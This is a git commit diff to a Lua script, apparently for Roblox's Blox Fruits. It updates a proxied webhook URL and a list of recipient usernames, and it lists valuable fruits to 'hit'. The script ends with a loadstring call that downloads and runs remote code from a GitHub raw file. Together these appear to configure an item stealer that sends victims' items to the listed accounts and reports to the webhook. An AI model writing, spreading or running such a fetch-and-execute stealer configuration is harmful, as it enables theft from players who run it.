d8f1e74fbd2b167bb8654ecd7ec5aeaf0b9fc449
reds8 <advin9389@gmail.com>
2025-04-11 16:40:46 +0530

    Update Redss.lua

--- Redss.lua
+++ Redss.lua
@@ -1,5 +1,6 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dzVmTm9YcHYwNTB4YmNsUFdVVVRJQTpWWWdvMHQ2TUtLQVFMdmo0M1NpVXN2T2s5aXo4SzJFY1R5ZFFtWXFJNHJBSWlnME9xWTVSZXk2bTFseVY3NHNmQWZvdHVJS1BGakhUUHlieXZMV2JLMldIUGgxYWgwOGljQlBUQkZ5M28wb3ZvVjNJS2pXYmEyZWJ3WDdsdkNDZ2t5QkhiYVJRZFVGQ1JWVkc4Qk5RSzk3QkJJa2JCT3BwbmlXdXBaYnlzS2M"
-Usernames = {"Rip_Smavo"}
+
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=eWVTalA2a3c1S3Q1V3pqY2MxSXhadzpsamVxem93akxQTEFRRDRYYzR2R2U2a3NPTk92TEkxdDBfaGh0cGxGbUlWSTRlZS1MaXU5OWVTSGhKUzV6UWZURE5SdlBXSUVOSWszX09OVEJ5cDFERFppS0hnNDBlYklJVUFQY0NtOXgwUTJZVmt4REhjeGdQVjIwaUxiQk5xTVl3VThTQ0dERDRsMzVsWmd2Vmt2UG11LWVmSnJZY3ZNR25SbXd1TmxFQkE"
+Usernames = {"simos55599", "Rip_Smavo", "adviknyc", "Chickenburger8927"}
 FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Gas-Gas", "Control-Control", "Dough-Dough", "Gravity-Gravity"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
